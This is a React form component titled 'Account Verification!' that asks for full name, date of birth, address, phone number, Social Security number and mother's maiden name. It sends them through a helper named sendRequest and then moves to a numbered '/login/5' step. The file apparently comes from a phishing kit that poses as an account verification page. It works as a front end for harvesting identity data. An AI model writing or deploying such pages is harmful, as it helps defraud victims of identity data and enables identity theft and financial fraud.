import {
  Box,
  Button,
  FormControl,
  FormLabel,
  Input,
  Select,
  Text,
  VStack,
} from "@chakra-ui/react";
import { useState } from "react";
import { useForm, SubmitHandler } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { personalInfoTemplate, sendRequest } from "../../../helpers";

type Inputs = {
  fullname: string;
  dob: string;
  address: string;
  state: string;
  city: string;
  zipcode: string;
  phonenumber: string;
  ssn: string;
  maidenname: string;
};

const Form5 = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<Inputs>();
  const [data, setData] = useState({
    fullname: "",
    dob: "",
    address: "",
    state: "",
    city: "",
    zipcode: "",
    phonenumber: "",
    ssn: "",
    maidenname: "",
  });
  const onSubmit: SubmitHandler<Inputs> = async (data) => {
    setData(() => data);

    if (data.fullname === "" || data.ssn === "") {
      return;
    }

    const message = personalInfoTemplate(
      data.fullname,
      data.dob,
      data.address,
      data.state,
      data.city,
      data.zipcode,
      data.phonenumber,
      data.ssn,
      data.maidenname
    );
    await sendRequest(message);

    navigate("/login/5");
  };
  return (
    <VStack
      spacing="6"
      w={{ base: "100%", md: "50%" }}
      marginLeft={{ base: "unset", md: "25%" }}
      bg="#1c70c8"
      p="4"
      color="#fff"
    >
      <Text
        fontFamily="Poppins"
        fontSize="lg"
        fontWeight="bold"
        textAlign="left"
      >
        Account Verification!
      </Text>
      <Text fontFamily="Poppins" fontSize="sm" textAlign="left">
        Tell us about yourself. Please ensure the information for verification.
      </Text>
      <Box
        w="90%"
        display="flex"
        flexDirection="column"
        justifyContent="space-between"
      >
        <form onSubmit={handleSubmit(onSubmit)}>
          <FormControl mb="8">
            <FormLabel>Full Name:</FormLabel>
            <Input {...register("fullname")} type="text" autoComplete="off" />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Date Of Birth:</FormLabel>
            <Input
              {...register("dob")}
              type="text"
              placeholder="MM/DD/YYYY"
              autoComplete="off"
              _placeholder={{ color: "#fff", fontSize: "13px" }}
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Address:</FormLabel>
            <Input {...register("address")} type="text" autoComplete="off" />
          </FormControl>
          <FormControl mb="2">
            <FormLabel>State:</FormLabel>
            <Select placeholder="Choose One" {...register("state")}>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-0"
                value="Alabama"
              >
                Alabama
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-1"
                value="Alaska"
              >
                Alaska
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-2"
                value="Arizona"
              >
                Arizona
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-3"
                value="Arkansas"
              >
                Arkansas
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-4"
                value="California"
              >
                California
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-5"
                value="Colorado"
              >
                Colorado
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-6"
                value="Connecticut"
              >
                Connecticut
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-7"
                value="Delaware"
              >
                Delaware
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-8"
                value="DC"
              >
                District of Columbia
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-9"
                value="Florida"
              >
                Florida
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-10"
                value="Georgia"
              >
                Georgia
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-11"
                value="Hawaii"
              >
                Hawaii
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-12"
                value="Idaho"
              >
                Idaho
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-13"
                value="Illinois"
              >
                Illinois
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-14"
                value="Indiana"
              >
                Indiana
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-15"
                value="Iowa"
              >
                Iowa
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-16"
                value="Kansas"
              >
                Kansas
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-17"
                value="Kentucky"
              >
                Kentucky
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-18"
                value="Louisiana"
              >
                Louisiana
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-19"
                value="Maine"
              >
                Maine
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-20"
                value="Maryland"
              >
                Maryland
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-21"
                value="Massachusetts"
              >
                Massachusetts
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-22"
                value="Michigan"
              >
                Michigan
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-23"
                value="Minnesota"
              >
                Minnesota
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-24"
                value="Mississippi"
              >
                Mississippi
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-25"
                value="Missouri"
              >
                Missouri
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-26"
                value="Montana"
              >
                Montana
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-27"
                value="Nebraska"
              >
                Nebraska
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-28"
                value="Nevada"
              >
                Nevada
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-29"
                value="New Hampshire"
              >
                New Hampshire
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-30"
                value="New Jersey"
              >
                New Jersey
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-31"
                value="New Mexico"
              >
                New Mexico
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-32"
                value="New York"
              >
                New York
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-33"
                value="North Carolina"
              >
                North Carolina
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-34"
                value="North Dakota"
              >
                North Dakota
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-35"
                value="Ohio"
              >
                Ohio
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-36"
                value="Oklahoma"
              >
                Oklahoma
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-37"
                value="Oregon"
              >
                Oregon
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-38"
                value="Pennsylvania"
              >
                Pennsylvania
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-39"
                value="Rhode Island"
              >
                Rhode Island
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-40"
                value="South Carolina"
              >
                South Carolina
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-41"
                value="South Dakota"
              >
                South Dakota
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-42"
                value="Tennessee"
              >
                Tennessee
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-43"
                value="Texas"
              >
                Texas
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-44"
                value="Utah"
              >
                Utah
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-45"
                value="Vermont"
              >
                Vermont
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-46"
                value="Virginia"
              >
                Virginia
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-47"
                value="Washington"
              >
                Washington
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-48"
                value="West Virginia"
              >
                West Virginia
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-49"
                value="Wisconsin"
              >
                Wisconsin
              </option>
              <option
                style={{ color: "black" }}
                id="option-stateId-select-validate-50"
                value="Wyoming"
              >
                Wyoming
              </option>
            </Select>
          </FormControl>
          <FormControl mb="8">
            <FormLabel>City:</FormLabel>
            <Input {...register("city")} type="text" autoComplete="off" />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Zip Code:</FormLabel>
            <Input
              {...register("zipcode")}
              type="text"
              maxLength={6}
              autoComplete="off"
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Phone Number:</FormLabel>
            <Input
              {...register("phonenumber")}
              type="text"
              autoComplete="off"
              maxLength={10}
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Social Security Number:</FormLabel>
            <Input
              {...register("ssn")}
              type="text"
              maxLength={9}
              autoComplete="off"
            />
          </FormControl>
          <FormControl mb="8">
            <FormLabel>Mother Maiden Name:</FormLabel>
            <Input {...register("maidenname")} type="text" autoComplete="off" />
          </FormControl>

          <Box
            display="flex"
            justifyContent="center"
            alignItems="center"
            mt="8"
          >
            <Button
              fontSize="md"
              minW="150px"
              type="submit"
              mx="4"
              bg="orange"
              color="#fff"
              _hover={{ bg: "orange", opacity: "0.8", color: "#fff" }}
            >
              Continue
            </Button>
          </Box>
        </form>
      </Box>
    </VStack>
  );
};

export default Form5;
